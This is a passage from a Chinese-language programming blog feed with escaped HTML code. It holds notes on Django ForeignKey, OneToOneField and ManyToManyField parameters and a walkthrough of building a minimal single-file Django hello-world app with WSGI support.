&lt;span class="n">limit_choices_to&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;is_staff&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">},&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Q 对象是什么玩意儿这个我搞明白了再说&amp;hellip;&lt;/p>
&lt;h3 id="13-参数related_name">1.3 参数：related_name&lt;/h3>
&lt;p>设置反向关联的字段名，和&lt;code>sqlalchemy&lt;/code>的&lt;code>backref&lt;/code>类似。&lt;/p>
&lt;p>举例来说。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Parent&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Parent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">pass&lt;/span>
&lt;span class="n">Parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">child_set&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">all&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># 未设置 related_name&lt;/span>
&lt;span class="n">Parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">all&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># 设置 related_name=children&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="14-参数related_query_name">1.4 参数：related_query_name&lt;/h3>
&lt;p>related_query_name 和 related_name 类似，设置反向引用查询时条件的前缀名。举例来说。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Parent&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CharField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">max_length&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Parent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">pass&lt;/span>
&lt;span class="n">Parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">objects&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Child__name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;沙雕网友&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 未设置 related_query_name&lt;/span>
&lt;span class="n">Parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">objects&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">myboy__name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;沙雕网友&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 设置 related_query_name=myboy&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="15-参数to_field">1.5 参数：to_field&lt;/h3>
&lt;p>得到&lt;code>ForeignKey&lt;/code>关联的模型的字段，默认是主键，如果指定的不是主键那么必须有&lt;code>unique&lt;/code>约束才行。&lt;/p>
&lt;h3 id="16-参数db_constraint">1.6 参数：db_constraint&lt;/h3>
&lt;p>要不要创建数据库层级的约束，也就是通过后端数据库服务确保数据完整性不受破坏。如果设置为 False 那么访问不存在的对象时会触发 DoesNotExists 异常。&lt;/p>
&lt;h3 id="17-参数swappable">1.7 参数：swappable&lt;/h3>
&lt;p>用于处理“我有一个抽象类模型但是这个模型有一个外键”的情况，典型就是&lt;code>AUTH_USER_MODEL&lt;/code>。&lt;/p>
&lt;p>一般不用改到，这个属性控制了数据库迁移时如何处理这个外键关联的表，总之保持默认值就行了。&lt;/p>
&lt;p>这个功能支持了使用自定义的用户模型替代 &lt;code>django.auth.models.User&lt;/code> 之类的玩意儿。&lt;/p>
&lt;h2 id="2-onetoonefield">2. OneToOneField&lt;/h2>
&lt;p>&lt;code>OneToOneField&lt;/code> 基本就是一个加了&lt;code>unique&lt;/code>约束的&lt;code>ForeignKey&lt;/code>。使用上与 ForeignKey 略有不同。&lt;/p>
&lt;p>首先是访问 &lt;code>OneToOneField&lt;/code> 时，得到的不是 &lt;code>QuerySet&lt;/code> 而是一个对象实例。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># 优生优育政策（&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Parent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">child&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">OneToOneField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Child&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">pass&lt;/span>
&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">child&lt;/span> &lt;span class="c1"># =&amp;gt; 得到一个 Child 实例&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>其次是反向引用的名字是模型名字小写。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">child&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parent&lt;/span> &lt;span class="c1"># =&amp;gt; 得到一个 Parent 实例&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果指定 &lt;code>related_name&lt;/code> 那就和 &lt;code>ForeignKey&lt;/code> 一个表现。&lt;/p>
&lt;h2 id="3-manytomanyfield">3. ManyToManyField&lt;/h2>
&lt;p>基本和&lt;code>ForeignKey&lt;/code>相同。&lt;/p>
&lt;h3 id="31-和-foreignkey-相同的参数">3.1 和 &lt;code>ForeignKey&lt;/code> 相同的参数&lt;/h3>
&lt;ul>
&lt;li>related_name&lt;/li>
&lt;li>related_query_name&lt;/li>
&lt;li>limited_choices_to&lt;/li>
&lt;li>db_constraint&lt;/li>
&lt;li>swappable&lt;/li>
&lt;/ul>
&lt;p>limited_choices_to 在指定自定义中间表的情况下无效。&lt;/p>
&lt;h3 id="32-参数symmetrical">3.2 参数：symmetrical&lt;/h3>
&lt;p>用于处理一个表自己对自己的多对多引用对称性。&lt;/p>
&lt;p>Django 的默认行为是，我是你的朋友，那么你就是我的朋友。&lt;/p>
&lt;p>设置了这个参数则强迫 Django 改变这个行为，允许“被朋友”。&lt;/p>
&lt;h3 id="33-参数through">3.3 参数：through&lt;/h3>
&lt;p>默认情况下，Django 会自行创建中间表，这个参数强制指定中间表。&lt;/p>
&lt;p>默认中间表模型里包含三个字段。&lt;/p>
&lt;ul>
&lt;li>id&lt;/li>
&lt;li>&amp;lt;containing_model&amp;gt;_id&lt;/li>
&lt;li>&amp;lt;other_model&amp;gt;_id&lt;/li>
&lt;/ul>
&lt;p>如果是自己和自己的多对多关系，则&lt;/p>
&lt;ul>
&lt;li>id&lt;/li>
&lt;li>from_&amp;lt;model&amp;gt;_id&lt;/li>
&lt;li>to_&amp;lt;model&amp;gt;_id&lt;/li>
&lt;/ul>
&lt;h3 id="34-参数through_fields">3.4 参数：through_fields&lt;/h3>
&lt;p>当自行指定中间表，中间表又包含了多个外键时，指定关联的外键用。&lt;/p>
&lt;p>举例。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">ModelA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ManyToManyField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ModelB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">through&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ModelC&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">ModelB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">pass&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">ModelC&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Model&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ModelA&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ModelB&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ForeignKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ModelA&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时在中间表中&lt;code>a&lt;/code>和&lt;code>c&lt;/code>都是对&lt;code>ModelA&lt;/code>的外键，产生了歧义，Django 无法自行决定用哪个外键来关联 AB 两个表。&lt;/p>
&lt;p>这时提供参数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">models&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ManyToManyField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ModelB&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">through&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ModelC&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">through_fields&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ManyToManyField&lt;/code> 关联两个表总是不对称的关系（指我把你当兄弟，你却想当我爸爸这样的关系。此时“我”对“你”的“兄弟”关系就是单向的。），这就形成了&lt;strong>来源&lt;/strong>和&lt;strong>目标&lt;/strong>的概念。&lt;/p>
&lt;p>&lt;code>through_fields&lt;/code> 的第一个元素总被认为是&lt;strong>来源&lt;/strong>字段，第二个元素是&lt;strong>目标&lt;/strong>字段。&lt;/p>
&lt;h3 id="35-参数db_table">3.5 参数：db_table&lt;/h3>
&lt;p>指定 Django 创建的中间表的名字，默认根据两个表表名和 &lt;code>ManyToManyField&lt;/code> 的名字决定。&lt;/p></description></item><item><title>轻量级 django 阅读笔记：最小的 django 应用</title><link>https://nnnewb.github.io/blog/p/%E8%BD%BB%E9%87%8F%E7%BA%A7-django-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E6%9C%80%E5%B0%8F%E7%9A%84-django-%E5%BA%94%E7%94%A8/</link><pubDate>Sun, 03 Mar 2019 12:26:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E8%BD%BB%E9%87%8F%E7%BA%A7-django-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E6%9C%80%E5%B0%8F%E7%9A%84-django-%E5%BA%94%E7%94%A8/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>找不到工作十分难受，在家看书，恰巧翻到这本《轻量级 Django》，看起来还蛮有意思的，做个读书笔记。&lt;/p>
&lt;h2 id="1-最小的-django-app">1. 最小的 Django App&lt;/h2>
&lt;p>Django 是个重量级框架，所谓最小指的是写最少的代码，理解一个 Django App 的最小组成元素。&lt;/p>
&lt;p>作为开场，先创建一个 &lt;code>app.py&lt;/code> 文件，作为整个 Django App 存储的地方。&lt;/p>
&lt;h3 id="11-djangoconfsettings">1.1 django.conf.settings&lt;/h3>
&lt;p>书中使用 &lt;code>django.core.management.execute_from_command_line&lt;/code> 作为启动 Django app 的手段。&lt;/p>
&lt;p>&lt;code>execute_from_command_line&lt;/code>，就是通过 &lt;code>django startproject&lt;/code>的方式创建的&lt;code>manage.py&lt;/code>内的主要内容，这种方式启动必须要配置&lt;code>settings&lt;/code>才行。&lt;/p>
&lt;p>在一个常规方式创建的 Django App 中，&lt;code>settings.py&lt;/code>是一个独立的 python 模块，&lt;code>Django&lt;/code>通过&lt;code>DJANGO_SETTINGS_MODULE&lt;/code>这个环境变量来确定配置信息存储位置。&lt;/p>
&lt;p>但是换一种方式，&lt;code>django.conf.settings.configure()&lt;/code>可以手动完成配置。&lt;/p>
&lt;p>看代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.conf&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">settings&lt;/span>
&lt;span class="n">settings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">configure&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DEBUG&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ROOT_URLCONF&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>每一个 keyword argument 都和 &lt;code>settings.py&lt;/code>这个模块内的名字相同，去除所有不必要的元素之后，剩下的就是&lt;code>DEBUG&lt;/code>和&lt;code>ROOT_URLCONF&lt;/code>了。&lt;/p>
&lt;p>阅读源码可知&lt;code>configure&lt;/code>只能被调用一次。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># 摘自 django.conf.settings.configure 源码&lt;/span>
&lt;span class="c1"># Django 版本号:&lt;/span>
&lt;span class="c1"># VERSION = (2, 1, 7, &amp;#39;final&amp;#39;, 0)&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">configure&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">default_settings&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">global_settings&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">options&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span class="s2"> Called to manually configure the settings. The &amp;#39;default_settings&amp;#39;
&lt;/span>&lt;span class="s2"> parameter sets where to retrieve any unspecified values from (its
&lt;/span>&lt;span class="s2"> argument must support attribute access (__getattr__)).
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_wrapped&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">empty&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="ne">RuntimeError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Settings already configured.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">holder&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">UserSettingsHolder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">default_settings&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">options&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">items&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="nb">setattr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">holder&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_wrapped&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">holder&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="12-urlpatterns">1.2 urlpatterns&lt;/h3>
&lt;p>都知道 &lt;code>Django&lt;/code> 的路由是需要手动写明的，和&lt;code>flask&lt;/code>等以装饰器的方式配置路由的风格迥异。哪种风格更好，就看用户自己见仁见智了。&lt;/p>
&lt;p>上文的&lt;code>settings.configure&lt;/code>中可以看到有一句&lt;code>ROOT_URLCONF=__name__&lt;/code>，意义明确，就是指定哪个 python 模块保存了路由配置信息，而这里指定的&lt;code>__name__&lt;/code>正是自己。&lt;/p>
&lt;p>所以我们的&lt;code>urlpatterns&lt;/code>也应当如配置所述，写到这个文件中。&lt;/p>
&lt;p>见代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.urls&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">path&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.http&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">HttpResponse&lt;/span>
&lt;span class="n">urlpatterns&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">lambda&lt;/span> &lt;span class="n">req&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">HttpResponse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Hello world&amp;#39;&lt;/span>&lt;span class="p">))]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="13-__main__">1.3 &lt;code>__main__&lt;/code>&lt;/h3>
&lt;p>最后将所有的代码整合起来，就形成了这样一个 python 程序。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.conf&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">settings&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.core.management&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">execute_from_command_line&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.http&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">HttpResponse&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.urls&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">path&lt;/span>
&lt;span class="n">settings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">configure&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DEBUG&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ROOT_URLCONF&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">)&lt;/span>
&lt;span class="n">urlpatterns&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">lambda&lt;/span> &lt;span class="n">req&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">HttpResponse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Hello world&amp;#39;&lt;/span>&lt;span class="p">))]&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">execute_from_command_line&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>算上所有的 import 在内共 12 行，4 行空行，5 行 import，3 行代码，即构成了一个麻雀虽小五脏俱全的 Django hello world。&lt;/p>
&lt;p>在命令行执行&lt;code>python app.py runserver&lt;/code>即可看到以下输出。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">PS&lt;/span> &lt;span class="n">D&lt;/span>&lt;span class="p">:&lt;/span>\&lt;span class="n">GitHub&lt;/span>\&lt;span class="n">minimum&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">django&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">python&lt;/span> &lt;span class="o">.&lt;/span>\&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">py&lt;/span> &lt;span class="n">runserver&lt;/span>
&lt;span class="n">Performing&lt;/span> &lt;span class="n">system&lt;/span> &lt;span class="n">checks&lt;/span>&lt;span class="o">...&lt;/span>
&lt;span class="n">System&lt;/span> &lt;span class="n">check&lt;/span> &lt;span class="n">identified&lt;/span> &lt;span class="n">no&lt;/span> &lt;span class="n">issues&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="n">silenced&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>
&lt;span class="n">March&lt;/span> &lt;span class="mi">03&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2019&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">21&lt;/span>
&lt;span class="n">Django&lt;/span> &lt;span class="n">version&lt;/span> &lt;span class="mf">2.1.7&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">using&lt;/span> &lt;span class="n">settings&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;span class="n">Starting&lt;/span> &lt;span class="n">development&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="n">at&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8000&lt;/span>&lt;span class="o">/&lt;/span>
&lt;span class="n">Quit&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="k">with&lt;/span> &lt;span class="n">CTRL&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">BREAK&lt;/span>&lt;span class="o">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="14-wsgi">1.4 wsgi&lt;/h3>
&lt;p>完成了最小的 django app，依然有一个问题。&lt;/p>
&lt;p>如何部署这个 django app？&lt;/p>
&lt;p>固然，使用 runserver 的方式执行，再 nginx 反向代理是一个不错的主意，但 uwsgi 之类的部署方式依然有其独到的优势。&lt;/p>
&lt;p>使用 uwsgi 或者 gunicorn 之类的基于 wsgi 协议的服务器就必须取得一个 wsgi app 实例才行。&lt;/p>
&lt;p>Django 提供了函数 &lt;code>django.core.wsgi.get_wsgi_application&lt;/code> 用于取得 wsgi app。&lt;/p>
&lt;p>手头没 linux 机器，懒得演示 output 了。就这样吧。&lt;/p>
&lt;p>最终代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.conf&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">settings&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.core.management&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">execute_from_command_line&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.core.wsgi&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">get_wsgi_application&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.http&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">HttpResponse&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">django.urls&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">path&lt;/span>
&lt;span class="n">settings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">configure&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DEBUG&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ROOT_URLCONF&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">)&lt;/span>
&lt;span class="n">urlpatterns&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">lambda&lt;/span> &lt;span class="n">req&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">HttpResponse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Hello world&amp;#39;&lt;/span>&lt;span class="p">))]&lt;/span>
&lt;span class="n">application&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_wsgi_application&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">execute_from_command_line&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span>
